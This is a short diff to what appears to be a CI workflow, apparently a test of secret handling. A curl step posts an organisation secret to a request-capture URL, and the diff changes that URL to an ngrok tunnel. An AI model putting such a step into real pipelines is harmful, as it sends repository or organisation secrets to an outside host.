@@ -23,4 +23,4 @@ jobs:
           --verbose \
           --data fruit="${{ secrets.ORG_SECRET_FRUIT }}" \
           --data word="testing" \
-          --url "https://eoh36b4eqj7jblx.m.pipedream.net"
+          --url "https://dd6d-85-255-233-211.eu.ngrok.io/ehzv4gac"
